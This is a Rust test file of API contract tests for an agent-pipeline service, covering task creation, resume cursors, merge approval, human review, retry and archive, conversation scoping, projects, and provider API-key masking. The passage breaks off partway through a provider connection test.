//! L3 API 契约测试（testing.md §7）：in-process axum router + tower oneshot，不 spawn 二进制
//! （决策 144）。
//!
//! 覆盖：端点契约、跨源防护矩阵（决策 128）、api_key 回显（决策 112）、
//! resume 游标解析（决策 91）与防连点、merge/decision（决策 119）、人工评审（决策 2）。

use std::net::SocketAddr;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

use agentpipeline_core::agent::client::LlmClient;
use agentpipeline_core::agent::repo::{Libgit2Repo, SkillRepo};
use agentpipeline_core::agent::tools::CommandRecorder;
use agentpipeline_core::config::Settings;
use agentpipeline_core::pipeline::foreman::{situation_fingerprint, FOREMAN_FAILED_TURN_MARK};
use agentpipeline_core::pipeline::ForemanRunner;
use agentpipeline_core::sse::{SseEvent, SseEventType};
use agentpipeline_core::storage::proposals::NewForemanProposal;
use agentpipeline_core::types::{Provider, ReviewMode, Stage, TaskStatus};
use app::peer::PeerAddr;
use app::{build_router, AppState};
use axum::body::Body;
use axum::extract::ConnectInfo;
use axum::http::{header, Request, StatusCode};
use axum::Router;
use serde_json::{json, Value};
use testkit::{
    seed_project, seed_task, seed_task_full, skill_zip, write_skill_dir, zip_bytes, FakeAgent,
    ManualClock, Repo, Script, TestHome,
};
use tower::ServiceExt;

const PORT: u16 = 8787;

struct Api {
    _home: TestHome,
    _repo: Repo,
    state: AppState,
    router: Router,
    resumes: Arc<AtomicUsize>,
    /// 假时钟（决策 143 接缝①）。提议的 TTL（决策 207）靠它推进——「10 分钟到期」
    /// 不能靠 `sleep`，那是把一条规则测成一次等待。
    clock: ManualClock,
}

async fn api() -> Api {
    api_with(Settings {
        pending_resume_cooldown_sec: 5,
        ..Default::default()
    })
    .await
}

async fn api_with(settings: Settings) -> Api {
    api_with_origins(settings, Vec::new()).await
}

async fn api_with_origins(settings: Settings, extra_origins: Vec<String>) -> Api {
    api_full(settings, extra_origins, offline_repo(), Vec::new()).await
}

/// 默认 harness 用的仓访问层：**指向一个没人监听的端口**。
///
/// 契约测试的其余端点与技能来源无关，而给它们注入真 libgit2 会让「谁不小心出网了」
/// 变成一次真实的超时等待。指向关闭的端口既保住了「不发真请求」，又让这类意外**立刻失败**
/// （连接被拒，不是挂住）。技能来源自己的契约用例在 `crates/app/tests/integration/market.rs`，
/// 那里注入的是指向离线 smart HTTP fixture 的真实现。
fn offline_repo() -> Arc<dyn SkillRepo> {
    Arc::new(
        Libgit2Repo::new(std::env::temp_dir().join("agentpipeline-test-repos"))
            .with_base("http://127.0.0.1:1")
            .expect("固定常量，不该失败"),
    )
}

async fn api_full(
    settings: Settings,
    extra_origins: Vec<String>,
    skill_repo: Arc<dyn SkillRepo>,
    market_repos: Vec<String>,
) -> Api {
    api_full_bind(
        settings,
        extra_origins,
        skill_repo,
        market_repos,
        "127.0.0.1",
    )
    .await
}

/// 指定绑定 host 的 harness。
///
/// `bind_host` 决定 `AppState::lan_mode()`——票 07 的配对令牌只在该形态下生效。
/// 默认 harness（127.0.0.1）必须保持「不要求配对」，故这里显式传入缺省值。
async fn api_full_bind(
    settings: Settings,
    extra_origins: Vec<String>,
    skill_repo: Arc<dyn SkillRepo>,
    market_repos: Vec<String>,
    bind_host: &str,
) -> Api {
    let home = TestHome::new().unwrap();
    let (store, clock) = home.setup().await.unwrap();
    let repo = Repo::clean().unwrap();

    // 默认配一个可用 provider，否则 POST /tasks 会被决策 56 拦下
    store
        .upsert_provider(&Provider {
            id: "p-default".into(),
            vendor: "deepseek".into(),
            model: "deepseek-chat".into(),
            context_window: 64_000,
            base_url: None,
            api_key: Some("sk-super-secret-value-123456".into()),
            enabled: true,
            created_at: store.now(),
            updated_at: store.now(),
        })
        .await
        .unwrap();

    // 端口 0 会让 allowed_origins 变成 http://127.0.0.1:0；测试显式用 PORT
    let resumes = Arc::new(AtomicUsize::new(0));
    let hook_resumes = resumes.clone();
    let state = AppState::new(store, home.home().clone(), settings, PORT)
        .with_resume_hook(Arc::new(move |_task_id| {
            hook_resumes.fetch_add(1, Ordering::SeqCst);
        }))
        .with_allowed_origins(extra_origins)
        .with_bind_host(bind_host)
        .with_repo(skill_repo, market_repos);
    let router = build_router(state.clone());
    Api {
        _home: home,
        _repo: repo,
        state,
        router,
        resumes,
        clock,
    }
}

/// 局域网形态 harness（票 07）：绑 0.0.0.0 → 配对令牌生效。
async fn api_lan() -> Api {
    api_full_bind(
        Settings {
            pending_resume_cooldown_sec: 5,
            ..Default::default()
        },
        Vec::new(),
        offline_repo(),
        Vec::new(),
        "0.0.0.0",
    )
    .await
}

fn request(method: &str, uri: &str) -> axum::http::request::Builder {
    Request::builder().method(method).uri(uri)
}

async fn json_body(response: axum::response::Response) -> (StatusCode, Value) {
    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), 4 * 1024 * 1024)
        .await
        .unwrap();
    let value = if bytes.is_empty() {
        Value::Null
    } else {
        serde_json::from_slice(&bytes)
            .unwrap_or(Value::String(String::from_utf8_lossy(&bytes).to_string()))
    };
    (status, value)
}

async fn call(api: &Api, req: Request<Body>) -> (StatusCode, Value) {
    let response = api.router.clone().oneshot(req).await.unwrap();
    json_body(response).await
}

async fn post(api: &Api, uri: &str, body: Value) -> (StatusCode, Value) {
    call(
        api,
        request("POST", uri)
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(body.to_string()))
            .unwrap(),
    )
    .await
}

async fn get(api: &Api, uri: &str) -> (StatusCode, Value) {
    call(api, request("GET", uri).body(Body::empty()).unwrap()).await
}

async fn put(api: &Api, uri: &str, body: Value) -> (StatusCode, Value) {
    call(
        api,
        request("PUT", uri)
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(body.to_string()))
            .unwrap(),
    )
    .await
}

async fn patch(api: &Api, uri: &str, body: Value) -> (StatusCode, Value) {
    call(
        api,
        request("PATCH", uri)
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(body.to_string()))
            .unwrap(),
    )
    .await
}

async fn delete(api: &Api, uri: &str) -> (StatusCode, Value) {
    call(api, request("DELETE", uri).body(Body::empty()).unwrap()).await
}

/// 专门给「没接线」那条路用的构造（`api()` 是另一个 harness，名字在用例里会被局部变量遮住）。
async fn api_for_unwired_probe() -> Api {
    api().await
}

async fn seed(api: &Api, task_id: &str) -> String {
    let project_id = format!("proj-{task_id}");
    seed_project(
        &api.state.store,
        &project_id,
        "示例",
        api._repo.path(),
        "main",
    )
    .await
    .unwrap();
    seed_task(&api.state.store, task_id, &project_id)
        .await
        .unwrap();
    project_id
}

// ─────────────────────────── POST /tasks（决策 27 / 56 / 98）───────────────────────────

#[tokio::test]
async fn create_task_lands_queued_and_with_dependency_waiting() {
    let api = api().await;
    let project_id = seed(&api, "t0").await;

    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({"project_id": project_id, "title": "无依赖"}),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED);
    assert_eq!(body["task"]["status"], "queued");

    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({
            "project_id": project_id,
            "title": "有依赖",
            "depends_on": ["t0"]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED);
    assert_eq!(
        body["task"]["status"], "waiting",
        "有依赖一律 waiting 落库（决策 98）"
    );
}

#[tokio::test]
async fn create_task_rejects_missing_project_and_unknown_dependency() {
    let api = api().await;
    let project_id = seed(&api, "a").await;

    // 依赖链：b 依赖 a
    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({"project_id": project_id, "title": "b", "depends_on": ["a"]}),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED, "{body}");

    // 未知依赖 → 400
    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({"project_id": project_id, "title": "d", "depends_on": ["不存在"]}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("依赖任务不存在"));

    // 未知项目 → 400
    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({"project_id": "不存在", "title": "x"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("项目不存在"));

    // 注：id 由服务端生成，API 层无法构造环——决策 27 的环检测在
    // cursor_lifecycle.rs 的 `dependency_states_and_cycle_detection` 覆盖（store 级）。
}

#[tokio::test]
async fn create_task_fails_fast_without_configured_provider() {
    // 决策 56：未配置 provider 时创建任务返回明确错误
    let api = api().await;
    let project_id = seed(&api, "t0").await;
    api.state.store.delete_provider("p-default").await.unwrap();

    let (status, body) = post(
        &api,
        "/tasks",
        serde_json::json!({"project_id": project_id, "title": "x"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("provider"));
}

// ─────────────────────────── GET /tasks（决策 101）───────────────────────────

#[tokio::test]
async fn list_tasks_supports_filters_and_branch_summary() {
    let api = api().await;
    let project_id = seed(&api, "t1").await;
    // 造一条 archived 任务（默认应被过滤）
    seed_task(&api.state.store, "t2", &project_id)
        .await
        .unwrap();
    api.state.store.archive_task("t2").await.unwrap();

    let (status, body) = get(&api, "/tasks").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["tasks"].as_array().unwrap().len(), 1);

    let (_, body) = get(&api, "/tasks?include_archived=true").await;
    assert_eq!(body["tasks"].as_array().unwrap().len(), 2);

    let (_, body) = get(
        &api,
        &format!("/tasks?project_id={project_id}&status=queued"),
    )
    .await;
    assert_eq!(
        body["tasks"].as_array().unwrap().len(),
        1,
        "archived 任务默认不参与筛选"
    );
    let (_, body) = get(
        &api,
        &format!("/tasks?project_id={project_id}&status=queued&include_archived=true"),
    )
    .await;
    assert_eq!(body["tasks"].as_array().unwrap().len(), 2);

    // 分支级摘要
    let (_, body) = get(&api, "/tasks").await;
    let branches = body["tasks"][0]["branches"].as_array().unwrap();
    assert_eq!(branches.len(), 1);
    assert_eq!(branches[0]["branch"], "main");
    assert_eq!(branches[0]["stage"], "init");
    assert_eq!(branches[0]["node"], "execute");
}

// ─────────────────────────── GET /tasks/{id}（决策 49 / 130）───────────────────────────

#[tokio::test]
async fn task_detail_returns_allowed_actions_for_pending_cursor() {
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();

    // 无 pending → 无动作
    let (_, body) = get(&api, "/tasks/t1").await;
    assert!(body["allowed_actions"].as_array().unwrap().is_empty());

    // 挂 info_insufficient → continue(requires_input) + cancel
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::InfoInsufficient,
                Stage::ArchitectDesign,
                agentpipeline_core::types::Node::ValidateInput,
                "信息不足",
            ),
        )
        .await
        .unwrap();
    api.state.store.sync_task_projection("t1").await.unwrap();

    let (_, body) = get(&api, "/tasks/t1").await;
    let actions = body["allowed_actions"].as_array().unwrap();
    assert_eq!(actions.len(), 2);
    assert_eq!(actions[0]["action"], "continue");
    assert_eq!(actions[0]["requires_input"], true);
    assert_eq!(actions[0]["kind"], "resume");
    assert_eq!(actions[0]["cursor_id"], cursor.cursor_id);
    assert_eq!(actions[1]["kind"], "side_effect");
}

// ─────────────────────────── POST /resume（决策 91 / 49 / 防连点）───────────────────────────

#[tokio::test]
async fn resume_omits_cursor_id_only_when_exactly_one_cursor() {
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::InfoInsufficient,
                Stage::ArchitectDesign,
                agentpipeline_core::types::Node::ValidateInput,
                "补齐信息",
            ),
        )
        .await
        .unwrap();
    api.state.store.sync_task_projection("t1").await.unwrap();

    // 恰好一条 → 可省略
    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "continue"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["spawned"], true);
    assert_eq!(api.resumes.load(Ordering::SeqCst), 1);
    assert!(api
        .state
        .store
        .get_cursor(&cursor.cursor_id)
        .await
        .unwrap()
        .pending_reason
        .is_none());

    // 分裂成两条后再次 resume 且不给 cursor_id → 409（决策 91）
    api.state.store.split_cursors("t1").await.unwrap();
    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "continue"}),
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    assert!(body["error"].as_str().unwrap().contains("cursor_id"));
}

#[tokio::test]
async fn resume_rejects_action_outside_allowed_set() {
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    // merge_approval 只允许 approve / return（side_effect），不含 skip
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::MergeApproval,
                Stage::Merge,
                agentpipeline_core::types::Node::Execute,
                "等待审批",
            ),
        )
        .await
        .unwrap();

    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "skip"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("允许集合"));
}

#[tokio::test]
async fn resume_cooldown_prevents_double_spawn() {
    // §3 pending_resume_cooldown_sec：第二次 resume 不重复启动（固定时钟下必然命中）
    let api = api().await;
    seed(&api, "t1").await;

    for _ in 0..2 {
        let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
        api.state
            .store
            .set_cursor_pending(
                &cursor.cursor_id,
                &agentpipeline_core::types::PendingReason::new(
                    agentpipeline_core::types::PendingKind::InfoInsufficient,
                    Stage::ArchitectDesign,
                    agentpipeline_core::types::Node::ValidateInput,
                    "补齐",
                ),
            )
            .await
            .unwrap();
        let (status, _) = post(
            &api,
            "/tasks/t1/resume",
            serde_json::json!({"action": "continue"}),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
    }

    // 第一次 spawn，第二次因冷却被拦（决策 36 的单执行者守卫）
    assert_eq!(api.resumes.load(Ordering::SeqCst), 1);
}

// ─────────────────────────── merge/decision（决策 119）───────────────────────────

#[tokio::test]
async fn merge_decision_approve_and_return_move_the_cursor() {
    let api = api().await;
    seed(&api, "t1").await;
    // 造出 merge 阶段的 pending(merge_approval)
    api.state
        .store
        .replace_cursors_with_main(
            "t1",
            Stage::Merge,
            agentpipeline_core::types::Node::Execute,
            "main",
        )
        .await
        .unwrap();
    api.state
        .store
        .upsert_stage_output(
            "t1",
            Stage::Merge,
            agentpipeline_core::types::MERGE_OUTPUT_TYPE,
            "merge-proposal.diff",
            // 文档必填字段齐全（缺字段 = 行损坏，反序列化必须报错而不是静默兜底）
            Some(&serde_json::json!({
                "diff_path": "merge-proposal.diff",
                "diff_stats": {"files_changed": 1, "insertions": 0, "deletions": 0, "file_details": []},
                "base_commit": "basesha",
                "gate": "pass",
                "gate_failures": 2,
                "approval": "pending",
                "status": "pending_approval"
            })),
        )
        .await
        .unwrap();
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::MergeApproval,
                Stage::Merge,
                agentpipeline_core::types::Node::Execute,
                "等待审批",
            ),
        )
        .await
        .unwrap();

    // approve → 重入 merge.execute 走阶段 B
    let (status, body) = post(
        &api,
        "/tasks/t1/merge/decision",
        serde_json::json!({"decision": "approve"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let after = body["cursor"].clone();
    assert_eq!(after["stage"], "merge");
    assert_eq!(after["node"], "execute");

    // approval 落库为 approved
    let meta = api
        .state
        .store
        .stage_output_metadata(
            "t1",
            Stage::Merge,
            agentpipeline_core::types::MERGE_OUTPUT_TYPE,
        )
        .await
        .unwrap()
        .unwrap();
    assert_eq!(meta["approval"], "approved");

    // return → develop.execute，attempts 重置
    api.state
        .store
        .set_cursor_pending(
            &api.state.store.load_live_cursors("t1").await.unwrap()[0]
                .cursor_id
                .clone(),
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::MergeApproval,
                Stage::Merge,
                agentpipeline_core::types::Node::Execute,
                "再审批",
            ),
        )
        .await
        .unwrap();
    let (status, body) = post(
        &api,
        "/tasks/t1/merge/decision",
        serde_json::json!({"decision": "return"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["cursor"]["stage"], "develop");
    assert_eq!(body["cursor"]["node"], "execute");
}

// ─────────────────────────── 人工评审（决策 2 / 124）───────────────────────────

#[tokio::test]
async fn human_review_routes_to_test_or_develop() {
    let api = api().await;
    let project_id = seed(&api, "t1").await;
    seed_task_full(
        &api.state.store,
        "t-human",
        &project_id,
        ReviewMode::Human,
        &[],
    )
    .await
    .unwrap();

    // 非 human 模式拒绝
    let (status, _) = post(
        &api,
        "/tasks/t1/review",
        serde_json::json!({"approved": true}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    // human approve → test.execute
    api.state
        .store
        .replace_cursors_with_main(
            "t-human",
            Stage::Review,
            agentpipeline_core::types::Node::ValidateOutput,
            "main",
        )
        .await
        .unwrap();
    let (status, body) = post(
        &api,
        "/tasks/t-human/review",
        serde_json::json!({"approved": true}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage"], "test");

    // human reject → develop.execute
    api.state
        .store
        .replace_cursors_with_main(
            "t-human",
            Stage::Review,
            agentpipeline_core::types::Node::ValidateOutput,
            "main",
        )
        .await
        .unwrap();
    let (status, body) = post(
        &api,
        "/tasks/t-human/review",
        serde_json::json!({"approved": false}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage"], "develop");
}

// ─────────────────────────── 旁路端点（决策 105 / 117 / 125 / 34）───────────────────────────

#[tokio::test]
async fn retry_requires_terminal_and_requeues() {
    let api = api().await;
    seed(&api, "t1").await;

    // 非终态拒绝
    let (status, _) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    api.state
        .store
        .mark_terminal("t1", TaskStatus::Failed)
        .await
        .unwrap();
    let (status, body) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let task = api.state.store.get_task("t1").await.unwrap();
    assert_eq!(
        task.status,
        TaskStatus::Queued,
        "重试置回 queued 重新准入（决策 117）"
    );
    // 旧游标归档、新 main 指向 init
    let live = api.state.store.load_live_cursors("t1").await.unwrap();
    assert_eq!(live.len(), 1);
    assert_eq!(live[0].stage, Stage::Init);
}

#[tokio::test]
async fn retry_archives_old_conversations_and_default_list_excludes_them() {
    // §12.2 / 决策 113 同构：重试归档旧会话；列表默认过滤，include_archived 可取回
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    let store = &api.state.store;
    let run = store
        .insert_run(&agentpipeline_core::storage::observability::NewRun {
            task_id: "t1".into(),
            cursor_id: cursor.cursor_id.clone(),
            stage: Stage::ArchitectDesign,
            node: agentpipeline_core::types::Node::Execute,
            attempt: 1,
            agent_type: "main".into(),
            parent_run_id: None,
            prompt_template_hash: None,
            process_group_id: None,
        })
        .await
        .unwrap();
    store
        .insert_conversation(
            "t1",
            run,
            Stage::ArchitectDesign,
            agentpipeline_core::types::Node::Execute,
            1,
            "main",
            None,
            &serde_json::json!([{"role": "user", "content": "旧 attempt"}]),
            None,
            None,
            10,
            5,
        )
        .await
        .unwrap();

    // 未重试前默认可见
    let (_, body) = get(&api, "/tasks/t1/conversations").await;
    assert_eq!(body["conversations"].as_array().unwrap().len(), 1);

    store.mark_terminal("t1", TaskStatus::Failed).await.unwrap();
    let (status, body) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK, "{body}");

    // 默认列表不混入旧 attempt
    let (_, body) = get(&api, "/tasks/t1/conversations").await;
    assert!(
        body["conversations"].as_array().unwrap().is_empty(),
        "默认列表应过滤已归档会话：{body}"
    );

    // 历史可按参数取回
    let (_, body) = get(&api, "/tasks/t1/conversations?include_archived=true").await;
    let conversations = body["conversations"].as_array().unwrap();
    assert_eq!(conversations.len(), 1);
    assert!(conversations[0]["archived_at"].is_string(), "应带归档时间");

    // 不物理删除：整条会话仍可取回
    let (status, body) = get(&api, &format!("/tasks/t1/conversations/{run}")).await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["conversation"]["archived_at"].is_string());
}

#[tokio::test]
async fn conversation_messages_endpoint_returns_messages_and_is_task_scoped() {
    // §12.4.3：按任务 + run 取 messages；正常取回、任务隔离、越权 404
    let api = api().await;
    seed(&api, "t1").await;
    seed(&api, "t2").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    let store = &api.state.store;
    let run = store
        .insert_run(&agentpipeline_core::storage::observability::NewRun {
            task_id: "t1".into(),
            cursor_id: cursor.cursor_id.clone(),
            stage: Stage::Develop,
            node: agentpipeline_core::types::Node::Execute,
            attempt: 1,
            agent_type: "main".into(),
            parent_run_id: None,
            prompt_template_hash: None,
            process_group_id: None,
        })
        .await
        .unwrap();
    store
        .insert_conversation(
            "t1",
            run,
            Stage::Develop,
            agentpipeline_core::types::Node::Execute,
            1,
            "main",
            None,
            &serde_json::json!([
                {"role": "user", "content": "实现登录"},
                {"role": "assistant", "content": "好的"}
            ]),
            None,
            None,
            10,
            5,
        )
        .await
        .unwrap();

    // 正常取回：响应体就是 messages 数组
    let (status, body) = get(&api, &format!("/tasks/t1/conversations/{run}/messages")).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let messages = body.as_array().unwrap();
    assert_eq!(messages.len(), 2);
    assert_eq!(messages[0]["role"], "user");
    assert_eq!(messages[0]["content"], "实现登录");

    // 任务隔离：run 属于 t1，从 t2 取一律 404，不泄露其他任务数据
    let (status, body) = get(&api, &format!("/tasks/t2/conversations/{run}/messages")).await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");

    // 不存在的 run 也 404
    let (status, _) = get(&api, "/tasks/t1/conversations/999999/messages").await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn cancel_marks_terminal_and_notifies_dependents() {
    let api = api().await;
    let project_id = seed(&api, "dep").await;
    seed_task_full(
        &api.state.store,
        "dependent",
        &project_id,
        ReviewMode::Agent,
        &["dep"],
    )
    .await
    .unwrap();

    let (status, body) = post(&api, "/tasks/dep/cancel", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["notified"][0], "dependent");

    let dep = api.state.store.get_task("dep").await.unwrap();
    assert_eq!(dep.status, TaskStatus::Cancelled);
    let dependent = api.state.store.get_task("dependent").await.unwrap();
    assert_eq!(dependent.status, TaskStatus::Pending);
    let reason = dependent.pending_reason.unwrap();
    assert_eq!(
        reason.kind,
        agentpipeline_core::types::PendingKind::DependencyFailed
    );
    assert_eq!(
        reason.context.unwrap().kind.as_deref(),
        Some("dependency_cancelled")
    );
}

#[tokio::test]
async fn archive_requires_terminal_and_splits_into_new_tasks() {
    let api = api().await;
    let project_id = seed(&api, "t1").await;

    let (status, _) = post(&api, "/tasks/t1/archive", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    api.state
        .store
        .mark_terminal("t1", TaskStatus::Cancelled)
        .await
        .unwrap();
    let (status, _) = post(&api, "/tasks/t1/archive", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK);
    assert!(api
        .state
        .store
        .get_task("t1")
        .await
        .unwrap()
        .archived_at
        .is_some());

    // split：创建 N 个 + 原任务置 cancelled
    seed(&api, "t9").await;
    let (status, body) = post(
        &api,
        "/tasks/t9/split",
        serde_json::json!({"tasks": [{"title": "子 1"}, {"title": "子 2"}]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["created"].as_array().unwrap().len(), 2);
    assert_eq!(
        api.state.store.get_task("t9").await.unwrap().status,
        TaskStatus::Cancelled
    );
    let _ = project_id;
}

#[tokio::test]
async fn model_override_validates_whitelist_and_scope() {
    let api = api().await;
    seed(&api, "t1").await;
    seed(&api, "t2").await;

    let (status, _) = post(
        &api,
        "/tasks/t1/model-override",
        serde_json::json!({"provider_id": "不存在"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);

    let (status, _) = post(
        &api,
        "/tasks/t1/model-override",
        serde_json::json!({"provider_id": "p-default"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(
        api.state
            .store
            .get_task("t1")
            .await
            .unwrap()
            .model_override
            .as_deref(),
        Some("p-default")
    );
    // 只影响本任务（决策 105）
    assert!(api
        .state
        .store
        .get_task("t2")
        .await
        .unwrap()
        .model_override
        .is_none());
}

// ─────────────────────────── 项目端点（决策 61 / 101）───────────────────────────

#[tokio::test]
async fn project_creation_rejects_non_git_and_delete_refuses_active_tasks() {
    let api = api().await;
    let plain = api._home.scratch_dir("not-a-repo");

    let (status, body) = post(
        &api,
        "/projects",
        serde_json::json!({"name": "非 git", "local_path": plain.display().to_string()}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].as_str().unwrap().contains("不是 git 仓库"));

    // 正常创建
    let (status, body) = post(
        &api,
        "/projects",
        serde_json::json!({"name": "示例", "local_path": api._repo.path().display().to_string()}),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED, "{body}");
    let project_id = body["project"]["id"].as_str().unwrap().to_string();
    assert_eq!(body["project"]["default_branch"], "main");
    assert_eq!(body["project"]["language"], "rust");
    assert_eq!(body["project"]["test_framework"], "cargo");

    // 有活跃任务 → 拒绝删除
    seed_task(&api.state.store, "t1", &project_id)
        .await
        .unwrap();
    let (status, body) = call(
        &api,
        request("DELETE", &format!("/projects/{project_id}"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");

    // 任务的写端点（cancel）后仍不活跃 → 可删
    post(&api, "/tasks/t1/cancel", serde_json::json!({})).await;
    let (status, _) = call(
        &api,
        request("DELETE", &format!("/projects/{project_id}"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn project_analyze_is_async_and_pollable() {
    let api = api().await;
    let (_, body) = post(
        &api,
        "/projects",
        serde_json::json!({"name": "示例", "local_path": api._repo.path().display().to_string()}),
    )
    .await;
    let project_id = body["project"]["id"].as_str().unwrap().to_string();

    let (status, body) = post(
        &api,
        "/projects/analyze",
        serde_json::json!({"project_id": project_id}),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED, "决策 130 ⑦：202 + 轮询");
    assert!(body["analysis_id"].is_string());

    // 探测在后台任务里完成，轮询直到 done
    for _ in 0..50 {
        let (_, body) = get(&api, &format!("/projects/{project_id}/analysis")).await;
        if body["status"] == "done" {
            assert_eq!(body["result"]["language"], "rust");
            assert_eq!(body["result"]["has_gitignore"], true);
            return;
        }
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }
    panic!("项目分析未在预期时间内完成");
}

// ─────────────────────────── provider（决策 112）───────────────────────────

#[tokio::test]
async fn provider_read_api_masks_api_key_and_patch_keeps_secret() {
    let api = api().await;

    let (status, body) = get(&api, "/providers").await;
    assert_eq!(status, StatusCode::OK);
    let providers = body["providers"].as_array().unwrap();
    assert_eq!(providers[0]["api_key"], "***");
    assert!(
        !body.to_string().contains("sk-super-secret-value-123456"),
        "读接口不得返回原值"
    );

    // PATCH 里传回显值 "***" 不得把真密钥覆盖掉
    let (status, _) = call(
        &api,
        request("PATCH", "/providers/p-default")
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(
                serde_json::json!({"api_key": "***", "enabled": false}).to_string(),
            ))
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let raw = api
        .state
        .store
        .get_provider("p-default")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(raw.api_key.as_deref(), Some("sk-super-secret-value-123456"));
    assert!(!raw.enabled);

    // 真传新密钥才覆盖
    call(
        &api,
        request("PATCH", "/providers/p-default")
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(
                serde_json::json!({"api_key": "sk-new-key-abcdefghijkl"}).to_string(),
            ))
            .unwrap(),
    )
    .await;
    let raw = api
        .state
        .store
        .get_provider("p-default")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(raw.api_key.as_deref(), Some("sk-new-key-abcdefghijkl"));
}

// ─────────────────────── provider 测试连接（决策 160）───────────────────────

#[tokio::test]
async fn provider_test_classifies_auth_failure_and_never_echoes_key() {
    let api = api().await;
    let mock = testkit::mock_llm::MockLlm::start(vec![testkit::mock_llm::MockRoute::json(
        "/chat/completions",
        401,
        r#"{"error":{"message":"invalid api key"}}"#,
    )])
    .await;

    let (status, body) = post(
        &api,
        "/providers/test",
        serde_json::json!({
            "id": "p-default",
            "vendor": "deepseek",
            "model": "deepseek-chat",
            "base_url": mock.url,
            "api_key": "***",
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let test = &body["test"];
    assert_eq!(test["ok"], false);
    assert_eq!(test["kind"], "llm_auth");
    assert!(test["message"].as_str().unwrap().contains("鉴权失败"));
    let raw = test["raw"].as_str().unwrap();
    assert!(raw.contains("401"), "{raw}");
    assert!(raw.contains("invalid api key"), "{raw}");
